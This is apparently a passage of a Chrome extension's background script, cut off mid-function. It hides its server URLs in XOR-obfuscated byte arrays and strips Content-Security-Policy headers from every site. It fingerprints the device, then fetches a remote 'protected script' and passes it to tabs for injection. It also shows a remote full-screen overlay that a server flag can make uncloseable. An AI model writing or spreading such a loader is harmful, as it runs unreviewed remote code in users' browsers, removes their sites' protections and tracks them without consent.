const _0x1a9e = [60,57,43,35,54,121,122,125,55,62,33,28,56,44,58,43,39,59,37,39,58,62,44,44,37,32,40,49,39,107,32,58,63,106,18,18,116,26,9,7,27,99,107,99,123,54,40,96,49,46,50,62,112,59,32,34,49,33,106,50,55,91,49,106,39,39];
const _0x5b3c = [60,57,43,35,54,121,122,125,55,62,33,28,56,44,58,43,39,59,37,39,58,62,44,44,37,32,40,49,39,107,32,58,63,106,18,18,116,26,9,7,27,99,107,99,123,50,53,98,48,40,38,36,47,39,104,108,39,55,35,44,121,90,58,36,42,48,125,52,49,61,49,99,34,58,102,39,46,45,58,53,55,120];
const _0x7c4e = [60,57,43,35,54,121,122,125,55,62,33,28,56,44,58,43,39,59,37,39,58,62,44,44,37,32,40,49,39,107,32,58,63,106,18,18,116,26,9,7,27,99,107,99,123,62,40,60,108,57,49,43,44,124,45,38,52,54,54,112,59,83,54,43,97,34,54,42];

function _0x3f2d(_b) {
  const _k = 'TM_SECURE_V2_ENCRYPT_LOCK';
  let _s = '';
  for (let _i = 0; _i < _b.length; _i++) {
    _s += String.fromCharCode(_b[_i] ^ _k.charCodeAt(_i % _k.length));
  }
  return _s;
}

const _rk = new Uint8Array(32);
if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
  crypto.getRandomValues(_rk);
} else {
  for (let _i = 0; _i < 32; _i++) _rk[_i] = Math.floor(Math.random() * 256);
}

let _sealedBytes = null;
let _pendingSeal = null;
let _cachedNoticeHtml = '';
let _noticeLastFetch = 0;
let _pendingNoticeFetch = null;
let _dismissedNoticeDay = '';
let _gmStore = {};
let _hasStoredDeviceId = false;
let _hasWindowDeviceId = false;
let _pendingVerify = null;

let _pendingWarmup = null;
const _activeTabInjections = new Map();
const _lastTabInjectAt = new Map();

function yieldDelay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function getLocalDayKey(d) {
  const dt = d || new Date();
  return dt.getFullYear() + '-' + String(dt.getMonth() + 1).padStart(2, '0') + '-' + String(dt.getDate()).padStart(2, '0');
}

function getNoticeDismissKey(dayKey, rawHtml) {
  const s = (rawHtml || '').trim();
  let h = 0x811c9dc5;
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = Math.imul(h, 0x01000193);
  }
  return dayKey + ':' + (h >>> 0).toString(16).padStart(8, '0');
}

function prepareNoticeHtml(rawHtml) {
  if (!rawHtml || typeof rawHtml !== 'string') return '';
  let cleaned = rawHtml
    .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '')
    .replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, '')
    .replace(/<embed\b[^>]*>/gi, '')
    .replace(/<base\b[^>]*>/gi, '')
    .replace(/<meta\b[^>]*http-equiv\s*=\s*["']?refresh["']?[^>]*>/gi, '')
    .trim();
  if (cleaned.length > 250000) {
    cleaned = cleaned.slice(0, 250000);
  }
  return cleaned;
}

function sanitizeNoticeHtml(rawHtml) {
  if (!rawHtml || typeof rawHtml !== 'string') return '';
  let cleaned = prepareNoticeHtml(rawHtml)
    .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
    .replace(/\s+on[a-z]+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, '')
    .replace(/javascript\s*:/gi, 'blocked:')
    .replace(/@import\s+(?:url\([^)]*\)|["'][^"']*["'])[^;]*;/gi, '')
    .trim();
  if (cleaned.length > 200000) {
    cleaned = cleaned.slice(0, 200000);
  }
  return cleaned;
}

function evaluateNoticeDecision(rawHtml, dismissedKey, todayKey) {
  const html = (rawHtml || '').trim();
  if (!html) return { shouldShow: false, locked: false, pauseScript: false, dismissKey: todayKey };
  if (/<!--\s*TM:OFF\s*-->/i.test(html)) return { shouldShow: false, locked: false, pauseScript: false, dismissKey: todayKey };
  const locked = /<!--\s*TM:LOCK\s*-->/i.test(html);
  const pauseScript = locked || /<!--\s*TM:PAUSE\s*-->/i.test(html);
  const dismissKey = getNoticeDismissKey(todayKey, html);
  if (locked) return { shouldShow: true, locked: true, pauseScript: true, dismissKey: dismissKey };
  if (dismissedKey && dismissedKey === dismissKey) {
    return { shouldShow: false, locked: false, pauseScript: false, dismissKey: dismissKey };
  }
  return { shouldShow: true, locked: false, pauseScript: pauseScript, dismissKey: dismissKey };
}

function _seal(str) {
  if (!str) return null;
  const arr = new Uint16Array(str.length);
  for (let i = 0; i < str.length; i++) {
    arr[i] = str.charCodeAt(i) ^ _rk[i & 31];
  }
  str = null;
  return arr;
}

function _unseal(arr) {
  if (!arr || !arr.length) return null;
  const chunks = [];
  for (let i = 0; i < arr.length; i += 4096) {
    const end = Math.min(i + 4096, arr.length);
    const codes = new Array(end - i);
    for (let j = i; j < end; j++) {
      codes[j - i] = arr[j] ^ _rk[j & 31];
    }
    chunks.push(String.fromCharCode.apply(null, codes));
  }
  return chunks.join('');
}

function murmur3(str, seed) {
  let h = seed;
  for (let i = 0; i < str.length; i++) {
    h = Math.imul(h ^ str.charCodeAt(i), 0x5bd1e995);
    h ^= h >>> 15;
  }
  return (h >>> 0).toString(16).padStart(8, '0').toUpperCase();
}

function computeDeterministicMachineId() {
  const parts = [];

  parts.push(navigator.hardwareConcurrency || 4);

  try {
    const dpr = (typeof window !== 'undefined' && window.devicePixelRatio) ? window.devicePixelRatio : 1;
    const w = Math.round((typeof window !== 'undefined' && window.screen ? window.screen.width : 1920) * dpr);
    const h = Math.round((typeof window !== 'undefined' && window.screen ? window.screen.height : 1080) * dpr);
    const cd = (typeof window !== 'undefined' && window.screen) ? window.screen.colorDepth : 24;
    parts.push(`${w}x${h}x${cd}`);
  } catch (e) {
    parts.push('1920x1080x24');
  }

  try {
    parts.push(Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC');
  } catch (e) {
    parts.push('UTC');
  }

  parts.push(navigator.platform || 'Win32');

  try {
    let gl = null;
    if (typeof document !== 'undefined') {
      const canvas = document.createElement('canvas');
      gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    } else if (typeof OffscreenCanvas !== 'undefined') {
      const canvas = new OffscreenCanvas(1, 1);
      gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    }
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        const vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || '';
        const renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || '';
        parts.push(`${vendor}~${renderer}`);
      }
    }
  } catch (e) {}

  const rawFingerprint = parts.join(':::');
  const h1 = murmur3(rawFingerprint, 0x13579BDF);
  const h2 = murmur3(rawFingerprint, 0x2468ACE0);

  return 'TM-' + h1.slice(0, 4) + '-' + h1.slice(4, 8) + '-' + h2.slice(0, 4);
}

const DEFAULT_FALLBACK_ID = computeDeterministicMachineId();

let memoryCache = {
  authorized: false,
  lastCheck: 0,
  deviceId: DEFAULT_FALLBACK_ID,
  engineRunning: true
};

let autoRunEnabled = true;

const _stateReady = new Promise((resolve) => {
  if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
    chrome.storage.local.get(
      ['typeme_auto_run', 'typeme_authorized', 'typeme_last_auth_at', 'typeme_device_id', 'typeme_window_id_set', 'typeme_ads_html', 'typeme_ads_fetched_at', 'typeme_ads_dismissed_day', 'typeme_gm_store'],
      (stored) => {
        if (stored) {
          if (typeof stored.typeme_auto_run === 'boolean') autoRunEnabled = stored.typeme_auto_run;
          if (typeof stored.typeme_authorized === 'boolean') memoryCache.authorized = stored.typeme_authorized;
          if (typeof stored.typeme_last_auth_at === 'number') memoryCache.lastCheck = stored.typeme_last_auth_at;
          if (stored.typeme_device_id) {
            memoryCache.deviceId = stored.typeme_device_id;
            _hasStoredDeviceId = true;
          }
          if (stored.typeme_window_id_set === true) {
            _hasWindowDeviceId = true;
          }
          if (typeof stored.typeme_ads_html === 'string') _cachedNoticeHtml = stored.typeme_ads_html;
          if (typeof stored.typeme_ads_fetched_at === 'number') _noticeLastFetch = stored.typeme_ads_fetched_at;
          if (typeof stored.typeme_ads_dismissed_day === 'string') _dismissedNoticeDay = stored.typeme_ads_dismissed_day;
          if (stored.typeme_gm_store && typeof stored.typeme_gm_store === 'object') {
            _gmStore = Object.assign({}, stored.typeme_gm_store);
          }
        }
        resolve();
      }
    );
  } else {
    resolve();
  }
});

async function fetchWithTimeout(url, timeoutMs) {
  const ms = timeoutMs || 5500;
  if (typeof AbortController === 'undefined') {
    return fetch(url, { cache: 'no-store' });
  }
  const ctrl = new AbortController();
  const timer = setTimeout(() => {
    try { ctrl.abort(); } catch (e) {}
  }, ms);
  try {
    return await fetch(url, { cache: 'no-store', signal: ctrl.signal });
  } finally {
    clearTimeout(timer);
  }
}

async function getOrInitDeviceId() {
  await _stateReady;
  if (_hasStoredDeviceId && memoryCache.deviceId) {
    return memoryCache.deviceId;
  }
  // Keep SW fallback in memory only; never persist over a missing window-context ID
  const deterministicId = computeDeterministicMachineId();
  memoryCache.deviceId = deterministicId;
  return deterministicId;
}

async function setupCspRules() {
  if (typeof chrome !== 'undefined' && chrome.declarativeNetRequest && chrome.declarativeNetRequest.updateSessionRules) {
    try {
      await chrome.declarativeNetRequest.updateSessionRules({
        removeRuleIds: [1, 2],
        addRules: [
          {
            id: 1,
            priority: 1,
            action: {
              type: "modifyHeaders",
              responseHeaders: [
                { header: "content-security-policy", operation: "remove" },
                { header: "content-security-policy-report-only", operation: "remove" },
                { header: "x-content-security-policy", operation: "remove" },
                { header: "x-webkit-csp", operation: "remove" }
              ]
            },
            condition: {
              resourceTypes: ["main_frame", "sub_frame", "script", "xmlhttprequest", "other"]
            }
          }
        ]
      });
    } catch (err) {}
  }
}

let _cspReady = setupCspRules();

function isAuthorizedMatch(rawText, targetId) {
  if (!targetId || !rawText) return false;
  const cleanTarget = targetId.trim().toLowerCase();

  if (rawText.toLowerCase().includes(cleanTarget)) return true;

  try {
    const data = JSON.parse(rawText);
    const arr = Array.isArray(data) ? data : Object.values(data).flat();
    if (arr.some(item => {
      const val = typeof item === 'string' ? item : item && item.id ? item.id : '';
      return String(val).trim().toLowerCase() === cleanTarget;
    })) {
      return true;
    }
  } catch (e) {}

  const tokens = rawText.match(/TM-[A-Za-z0-9-]+/gi) || [];
  return tokens.some(t => t.toLowerCase() === cleanTarget);
}

async function fetchRemoteNotice(forceRefresh) {
  await _stateReady;
  const ttlMs = _cachedNoticeHtml ? 60000 : 8000;
  const minForceGap = 10000;
  if (_noticeLastFetch > 0 && Date.now() - _noticeLastFetch < (forceRefresh ? minForceGap : ttlMs)) {
    return _cachedNoticeHtml;
  }
  if (_pendingNoticeFetch) return _pendingNoticeFetch;

  _pendingNoticeFetch = (async () => {
    try {
      const res = await fetchWithTimeout(_0x3f2d(_0x7c4e) + '?_t=' + Date.now(), 8000);
      if (res && res.ok) {
        const text = await res.text();
        const cleaned = prepareNoticeHtml(text);
        _cachedNoticeHtml = cleaned;
        _noticeLastFetch = Date.now();
        if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
          if (cleaned) {
            chrome.storage.local.set({ typeme_ads_html: cleaned, typeme_ads_fetched_at: _noticeLastFetch });
          } else {
            chrome.storage.local.set({ typeme_ads_fetched_at: _noticeLastFetch });
            chrome.storage.local.remove('typeme_ads_html');
          }
        }
      }
    } catch (e) {
    } finally {
      _pendingNoticeFetch = null;
    }
    return _cachedNoticeHtml;
  })();

  return _pendingNoticeFetch;
}

async function getNoticeForTab(forceRefresh) {
  await _stateReady;
  const todayKey = getLocalDayKey();
  const ttlMs = _cachedNoticeHtml ? 60000 : 8000;
  const isFresh = _noticeLastFetch > 0 && Date.now() - _noticeLastFetch < ttlMs;
  const isRecentlyForced = _noticeLastFetch > 0 && Date.now() - _noticeLastFetch < 10000;

  let html = _cachedNoticeHtml;
  if ((forceRefresh && !isRecentlyForced) || !html || !isFresh) {
    if ((forceRefresh && !isRecentlyForced) || (!html && _noticeLastFetch === 0) || (!html && Date.now() - _noticeLastFetch >= 8000)) {
      html = await fetchRemoteNotice(Boolean(forceRefresh));
    } else if (!isFresh) {
      fetchRemoteNotice(false);
    }
  }

  const decision = evaluateNoticeDecision(html, _dismissedNoticeDay, todayKey);
  return {
    shouldShow: decision.shouldShow,
    locked: decision.locked,
    pauseScript: decision.pauseScript,
    html: decision.shouldShow ? html : '',
    dayKey: decision.dismissKey || todayKey
  };
}

async function ensureSealedPayload() {
  if (_sealedBytes) return true;
  if (_pendingSeal) return _pendingSeal;

  _pendingSeal = (async () => {
    let text = null;
    try {
      const res = await fetchWithTimeout(_0x3f2d(_0x5b3c) + '?_t=' + Date.now(), 15000);
      if (!res || !res.ok) {
        return false;
      }
      text = await res.text();
      if (text && !text.trim().startsWith('<')) {
        _sealedBytes = _seal(text);
      }
      return Boolean(_sealedBytes);
    } catch (err) {
      return false;
    } finally {
      text = null;
      _pendingSeal = null;
    }
  })();

  return _pendingSeal;
}

async function getOneTimePayload() {
  if (!_sealedBytes) {
    await ensureSealedPayload();
  }
  return _unseal(_sealedBytes);
}

let _pendingVerifyId = '';

async function verifyDeviceAuthorization(overrideDeviceId) {
  if (_pendingVerify) {
    if (!overrideDeviceId || overrideDeviceId === _pendingVerifyId) {
      return _pendingVerify;
    }
    try { await _pendingVerify; } catch (e) {}
  }

  _pendingVerifyId = overrideDeviceId || '';
  _pendingVerify = (async () => {
    try {
      await _stateReady;
      if (overrideDeviceId) {
        memoryCache.deviceId = overrideDeviceId;
        _hasStoredDeviceId = true;
        _hasWindowDeviceId = true;
      }
      const currentDeviceId = overrideDeviceId || (await getOrInitDeviceId());
      const res = await fetchWithTimeout(_0x3f2d(_0x1a9e) + '?_t=' + Date.now(), 6000);
      if (!res || !res.ok) {
        return {
          authorized: false,
          deviceId: currentDeviceId,
          error: 'Verification server unavailable'
        };
      }
      const text = await res.text();
      const authorized = isAuthorizedMatch(text, currentDeviceId);

      memoryCache.authorized = authorized;
      memoryCache.lastCheck = Date.now();

      if (!authorized) {
        _sealedBytes = null;
      }

      if (chrome.storage && chrome.storage.local) {
        const updateObj = {
          typeme_authorized: authorized,
          typeme_last_auth_at: memoryCache.lastCheck
        };
        if (_hasWindowDeviceId || overrideDeviceId) {
          updateObj.typeme_device_id = currentDeviceId;
          updateObj.typeme_window_id_set = true;
        }
        chrome.storage.local.set(updateObj);
      }

      return {
        authorized: authorized,
        deviceId: currentDeviceId
      };
    } catch (e) {
      return { authorized: memoryCache.authorized, deviceId: memoryCache.deviceId, error: 'Fetch failed' };
    } finally {
      _pendingVerify = null;
      _pendingVerifyId = '';
    }
  })();
  return _pendingVerify;
}

async function runSequentialWarmup() {
  if (_pendingWarmup) return _pendingWarmup;
  _pendingWarmup = (async () => {
    try {
      await _stateReady;
      // Stage 1: Verify ID first unless already verified very recently
      if (!memoryCache.authorized || Date.now() - memoryCache.lastCheck > 60000) {
        const auth = await verifyDeviceAuthorization();
        if (!auth || !auth.authorized) return false;
      }

      // Stage 2: Load script after brief micro-yield
      await yieldDelay(25);
      await ensureSealedPayload();

      // Stage 3: Load advertisement HTML last after yielding
      await yieldDelay(25);
      await fetchRemoteNotice(false);
      return true;
    } catch (e) {
      return false;
    } finally {
      _pendingWarmup = null;
    }
  })();
  return _pendingWarmup;
}

chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
  if (req.type === 'GET_STATUS') {
    getOrInitDeviceId().then((currentId) => {
      sendResponse({
        authorized: memoryCache.authorized,
        deviceId: currentId,
        engineRunning: memoryCache.engineRunning
      });
    });
    return true;
  } else if (req.type === 'VERIFY_NOW') {
    verifyDeviceAuthorization(req.deviceId || null).then(result => sendResponse(result));
    return true;
  } else if (req.type === 'TOGGLE_ENGINE') {
    memoryCache.engineRunning = !memoryCache.engineRunning;
    sendResponse({ engineRunning: memoryCache.engineRunning });
  } else if (req.type === 'GET_AUTO_RUN') {
    _stateReady.then(() => sendResponse({ autoRun: autoRunEnabled }));
    return true;
  } else if (req.type === 'SET_AUTO_RUN') {
    autoRunEnabled = Boolean(req.autoRun);
    if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
      chrome.storage.local.set({ typeme_auto_run: autoRunEnabled });
    }
    sendResponse({ success: true, autoRun: autoRunEnabled });
    return true;
  } else if (req.type === 'DISMISS_NOTICE_TODAY') {
    (async () => {
      await _stateReady;
      const key = (req && req.dayKey) ? String(req.dayKey) : getLocalDayKey();
      _dismissedNoticeDay = key;
      if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
        await new Promise((resolve) => {
          chrome.storage.local.set({ typeme_ads_dismissed_day: key }, () => resolve());
        });
      }
      if (req && req.resumePaused && sender && sender.tab && sender.tab.id) {
        injectEngineIntoTab(sender.tab.id);
      }
      sendResponse({ success: true, dayKey: key });
    })();
    return true;
  } else if (req.type === 'TM_GM_SET') {
    (async () => {
      await _stateReady;
      if (req && req.key) {
        _gmStore[String(req.key)] = req.value;
        if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
          await new Promise((resolve) => {
            chrome.storage.local.set({ typeme_gm_store: Object.assign({}, _gmStore) }, () => resolve());
          });
        }
      }
      sendResponse({ success: true });
    })();
    return true;
  } else if (req.type === 'TM_GM_DEL') {
    (async () => {
      await _stateReady;
      if (req && req.key) {
        delete _gmStore[String(req.key)];
        if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
          await new Promise((resolve) => {
            chrome.storage.local.set({ typeme_gm_store: Object.assign({}, _gmStore) }, () => resolve());
          });
        }
      }
      sendResponse({ success: true });
    })();
    return true;
  } else if (req.type === 'TM_GM_MERGE') {
    (async () => {
      await _stateReady;
      if (req && req.entries && typeof req.entries === 'object') {
        const keys = Object.keys(req.entries);
        let changed = false;
        for (let i = 0; i < keys.length; i++) {
          const k = keys[i];
          if (!Object.prototype.hasOwnProperty.call(_gmStore, k)) {
            _gmStore[k] = req.entries[k];
            changed = true;
          }
        }
        if (changed && typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
          await new Promise((resolve) => {
            chrome.storage.local.set({ typeme_gm_store: Object.assign({}, _gmStore) }, () => resolve());
          });
        }
      }
      sendResponse({ success: true });
    })();
    return true;
  } else if (req.type === 'GET_NOTICE_STATE') {
    getNoticeForTab(false).then(res => sendResponse(res));
    return true;
  } else if (req.type === 'REQUEST_TAB_INJECT') {
    (async () => {
      await _stateReady;
      if (req && req.deviceId && !_hasWindowDeviceId) {
        memoryCache.deviceId = req.deviceId;
        _hasStoredDeviceId = true;
        _hasWindowDeviceId = true;
        if (typeof chrome !== 'undefined' && chrome.storage && chrome.storage.local) {
          chrome.storage.local.set({ typeme_device_id: req.deviceId, typeme_window_id_set: true });
        }
      }
      if (!autoRunEnabled || !memoryCache.engineRunning) {
        sendResponse({ ok: false, skipped: true });
        return;
      }
      const senderTabId = sender && sender.tab && sender.tab.id ? sender.tab.id : null;
      if (!senderTabId) {
        sendResponse({ ok: false, error: 'Missing sender tab' });
        return;
      }
      const result = await injectEngineIntoTab(senderTabId, false);
      sendResponse(result || { ok: false });
    })();
    return true;
  } else if (req.type === 'GET_PROTECTED_SCRIPT') {
    (async () => {
      await _stateReady;
      if (!autoRunEnabled || !memoryCache.engineRunning) {
        sendResponse({ authorized: false, script: null });
        return;
      }

      const senderTabId = sender && sender.tab && sender.tab.id ? sender.tab.id : null;
      if (senderTabId) {
        if (_activeTabInjections.has(senderTabId)) {
          sendResponse({ authorized: false, script: null, skippedDuplicate: true });
          return;
        }
        const lastAt = _lastTabInjectAt.get(senderTabId) || 0;
        if (Date.now() - lastAt < 2000) {
          sendResponse({ authorized: false, script: null, skippedDuplicate: true });
          return;
        }
      }

      // Stage 1: Verify device ID first
      if (!memoryCache.authorized || Date.now() - memoryCache.lastCheck > 60000) {
        await verifyDeviceAuthorization();
      }
      if (!memoryCache.authorized) {
        sendResponse({ authorized: false, script: null });
        return;
      }

      // Stage 2: Load script sequentially before fetching advertisement HTML
      let payload = await getOneTimePayload();
      if (!payload) {
        sendResponse({ authorized: true, script: null });
        return;
      }
      await yieldDelay(160);

      // Stage 3: Load advertisement HTML after script is ready
      const notice = await getNoticeForTab(false);

      if (notice.shouldShow && notice.pauseScript) {
        payload = null;
        sendResponse({
          authorized: true,
          script: null,
          notice: notice,
          gmStore: Object.assign({}, _gmStore)
        });
        return;
      }
      try {
        sendResponse({
          authorized: true,
          script: payload,
          notice: notice.shouldShow ? notice : null,
          gmStore: Object.assign({}, _gmStore)
        });
      } finally {
        payload = null;
      }
    })();
    return true;
  } else if (req.type === 'INJECT_ACTIVE_TAB') {
    chrome.tabs.query({ active: true, currentWindow: true }, async (tabs) => {
      if (tabs && tabs[0] && tabs[0].id) {
        const targetTabId = tabs[0].id;
        const result = await injectEngineIntoTab(targetTabId, true);
        sendResponse({
          success: Boolean(result && result.ok),
          pausedByNotice: Boolean(result && result.pausedByNotice),
          cspBlocked: Boolean(result && result.cspBlocked),
          error: result && result.error ? result.error : null,
          tabId: targetTabId
        });
      } else {
        sendResponse({ success: false, error: 'No active tab' });
      }
    });
    return true;
  }
});

function runNoticeInMainWorld(rawHtml, isLocked, dayKey, isPaused) {
  if (window.top !== window.self) return;
  if (!rawHtml || document.getElementById('tm-notice-host')) return;

  if (!isLocked) {
    try {
      if (localStorage.getItem('TM_n_day') === dayKey) return;
    } catch (e) {}
  }

  let closed = false;
  let guardObs = null;
  let restoreTimer = null;
  let fallbackTimer = null;
  let frameReady = false;
  let adIframe = null;

  function toTrustedHtml(str) {
    if (window.trustedTypes && typeof window.trustedTypes.createPolicy === 'function') {
      try {
        const policy = window.__tmHtmlPolicy || window.trustedTypes.createPolicy('tm-html', {
          createHTML: (s) => s
        });
        window.__tmHtmlPolicy = policy;
        return policy.createHTML(str);
      } catch (e) {}
    }
    return str;
  }

  function stripUnsafeForShadow(htmlStr) {
    return String(htmlStr || '')
      .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
      .replace(/<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi, '')
      .replace(/<object\b[^<]*(?:(?!<\/object>)<[^<]*)*<\/object>/gi, '')
      .replace(/<embed\b[^>]*>/gi, '')
      .replace(/<base\b[^>]*>/gi, '')
      .replace(/<meta\b[^>]*http-equiv\s*=\s*["']?refresh["']?[^>]*>/gi, '')
      .replace(/\s+on[a-z]+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]+)/gi, '')
      .replace(/javascript\s*:/gi, 'blocked:')
      .replace(/@import\s+(?:url\([^)]*\)|["'][^"']*["'])[^;]*;/gi, '');
  }

  const isFullDoc = /<(?:!doctype|html|head|body)\b/i.test(rawHtml) || /position\s*:\s*fixed|min-height\s*:\s*100vh/i.test(rawHtml);

  const host = document.createElement('div');
  host.id = 'tm-notice-host';
  host.style.cssText = 'position:fixed;inset:0;z-index:2147483647;pointer-events:auto;';

  const shadow = host.attachShadow ? host.attachShadow({ mode: 'open' }) : host;

  const baseStyle = document.createElement('style');
  baseStyle.textContent = [
    ':host{all:initial;position:fixed !important;inset:0 !important;z-index:2147483647 !important;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif !important;}',
    '.tm-backdrop{position:fixed !important;inset:0 !important;z-index:2147483647 !important;background:rgba(5,8,15,0.84) !important;display:flex !important;align-items:center !important;justify-content:center !important;padding:16px !important;margin:0 !important;box-sizing:border-box !important;}',
    isFullDoc
      ? '.tm-card{position:relative !important;width:min(94vw,720px) !important;max-width:720px !important;height:min(88vh,740px) !important;max-height:88vh !important;background:#06060b !important;color:#f8fafc !important;border:1px solid rgba(52,211,153,0.35) !important;border-radius:14px !important;box-shadow:0 24px 60px rgba(0,0,0,0.75) !important;overflow:hidden !important;display:flex !important;flex-direction:column !important;margin:0 !important;padding:0 !important;}'
      : '.tm-card{position:relative !important;width:100% !important;max-width:560px !important;max-height:88vh !important;background:#0f172a !important;color:#f8fafc !important;border:1px solid rgba(52,211,153,0.35) !important;border-radius:14px !important;box-shadow:0 24px 60px rgba(0,0,0,0.65) !important;overflow:hidden !important;display:flex !important;flex-direction:column !important;margin:0 !important;padding:0 !important;}',
    '.tm-bar{position:relative !important;z-index:2147483647 !important;flex-shrink:0 !important;display:flex !important;align-items:center !important;justify-content:flex-end !important;padding:8px 12px !important;margin:0 !important;border-bottom:1px solid rgba(148,163,184,0.14) !important;background:rgba(15,23,42,0.98) !important;pointer-events:auto !important;}',
    '.tm-close-btn{position:relative !important;z-index:2147483647 !important;background:#1e293b !important;color:#e2e8f0 !important;border:1px solid #334155 !important;border-radius:6px !important;padding:5px 12px !important;margin:0 !important;font-size:12px !important;font-weight:600 !important;cursor:pointer !important;line-height:1.4 !important;pointer-events:auto !important;user-select:none !important;}',
    '.tm-close-btn:hover{background:#334155 !important;color:#fff !important;}',
    isFullDoc
      ? '.tm-body{position:relative !important;z-index:1 !important;flex:1 1 auto !important;min-height:0 !important;padding:0 !important;margin:0 !important;overflow:hidden !important;display:flex !important;flex-direction:column !important;height:100% !important;transform:translateZ(0) !important;}'
      : '.tm-body{position:relative !important;z-index:1 !important;flex:1 1 auto !important;min-height:0 !important;padding:0 !important;margin:0 !important;overflow-y:auto !important;overflow-x:hidden !important;line-height:1.5;font-size:14px;color:#e2e8f0;display:flex !important;flex-direction:column !important;height:auto !important;transform:translateZ(0) !important;}',
    '.tm-body.tm-shadow-mode{overflow-y:auto !important;overflow-x:hidden !important;display:block !important;' + (isFullDoc ? 'padding:16px !important;' : 'padding:16px !important;') + '}',
    '.tm-body.tm-shadow-mode .gate{position:absolute !important;inset:0 !important;}',
    '.tm-body.tm-shadow-mode .mesh,.tm-body.tm-shadow-mode .grid-bg,.tm-body.tm-shadow-mode .noise,.tm-body.tm-shadow-mode .scanlines,.tm-body.tm-shadow-mode .vignette,.tm-body.tm-shadow-mode .mouse-light,.tm-body.tm-shadow-mode .flash,.tm-body.tm-shadow-mode .gbar,.tm-body.tm-shadow-mode .cube,.tm-body.tm-shadow-mode .bolt,.tm-body.tm-shadow-mode #canvas{position:absolute !important;pointer-events:none !important;}'
  ].join('');

  const backdrop = document.createElement('div');
  backdrop.className = 'tm-backdrop';

  const card = document.createElement('div');
  card.className = 'tm-card';

  function onFrameMessage(ev) {
    if (!adIframe || ev.source !== adIframe.contentWindow) return;
    const d = ev.data;
    if (!d || typeof d !== 'object' || !d.__tmAdFrame) return;
    if (d.__tmAdFrame === 'ready') {
      frameReady = true;
      if (fallbackTimer) {
        clearTimeout(fallbackTimer);
        fallbackTimer = null;
      }
      if (!isFullDoc && typeof d.h === 'number' && d.h > 20) {
        const targetH = Math.min(Math.max(d.h + 8, 100), Math.round(window.innerHeight * 0.78));
        adIframe.style.height = targetH + 'px';
      }
    } else if (d.__tmAdFrame === 'close' && !isLocked) {
      dismissNow();
    }
  }

  window.addEventListener('message', onFrameMessage);

  function dismissNow(ev) {
    if (ev && ev.stopPropagation) ev.stopPropagation();
    if (isLocked || closed) return;
    closed = true;
    window.removeEventListener('message', onFrameMessage);
    if (fallbackTimer) {
      clearTimeout(fallbackTimer);
      fallbackTimer = null;
    }
    if (restoreTimer) {
      clearTimeout(restoreTimer);
      restoreTimer = null;
    }
    if (guardObs) {
      try { guardObs.disconnect(); } catch (e) {}
      guardObs = null;
    }
    try { localStorage.setItem('TM_n_day', dayKey); } catch (e) {}
    try {
      window.dispatchEvent(new CustomEvent('__tm_ext_sync', {
        detail: JSON.stringify({
          action: 'TM_DISMISS_NOTICE',
          dayKey: dayKey,
          resumePaused: Boolean(isPaused)
        })
      }));
    } catch (e) {}
    try { host.remove(); } catch (e) {}
  }

  if (!isLocked) {
    const bar = document.createElement('div');
    bar.className = 'tm-bar';
    const closeBtn = document.createElement('button');
    closeBtn.type = 'button';
    closeBtn.className = 'tm-close-btn';
    closeBtn.textContent = 'Close';
    closeBtn.addEventListener('click', dismissNow);
    bar.appendChild(closeBtn);
    card.appendChild(bar);
  }

  const contentWrap = document.createElement('div');
  contentWrap.className = 'tm-body';

  function mountShadowFallback() {
    if (closed || frameReady) return;
    if (adIframe) {
      try { adIframe.remove(); } catch (e) {}
      adIframe = null;
    }
    contentWrap.innerHTML = '';
    contentWrap.classList.add('tm-shadow-mode');

    const safeHtml = stripUnsafeForShadow(rawHtml);
    try {
      const parser = new DOMParser();
      const doc = parser.parseFromString(toTrustedHtml(safeHtml), 'text/html');
      const links = doc.querySelectorAll('link[rel="stylesheet"]');
      for (let i = 0; i < links.length; i++) {
        const href = links[i].getAttribute('href');
        if (href && /^https:\/\//i.test(href)) {
          const lk = document.createElement('link');
          lk.rel = 'stylesheet';
          lk.href = href;
          shadow.appendChild(lk);
        }
      }
      const styles = doc.querySelectorAll('style');
      for (let i = 0; i < styles.length; i++) {
        const st = document.createElement('style');
        const rawCss = styles[i].textContent || '';
        st.textContent = rawCss
          .replace(/:root\b/gi, ':host, .tm-body')
          .replace(/(^|[},\s])body(?=[\s{,:])/gi, '$1.tm-body')
          .replace(/(^|[},\s])html(?=[\s{,:])/gi, '$1.tm-body');
        shadow.appendChild(st);
      }
      if (doc.body) {
        const kids = Array.from(doc.body.childNodes);
        for (let i = 0; i < kids.length; i++) {
          if (kids[i].nodeName && kids[i].nodeName.toUpperCase() === 'SCRIPT') continue;
          contentWrap.appendChild(document.importNode(kids[i], true));
        }
      }
    } catch (e) {
      contentWrap.textContent = safeHtml;
    }

    const gateEl = contentWrap.querySelector('.gate, #gate');
    if (gateEl) {
      const skipGate = () => {
        gateEl.style.display = 'none';
        const animEls = contentWrap.querySelectorAll('.ad-card, .status, .live, .countdown, h1, .sub, .services-line, .btn, .urgency');
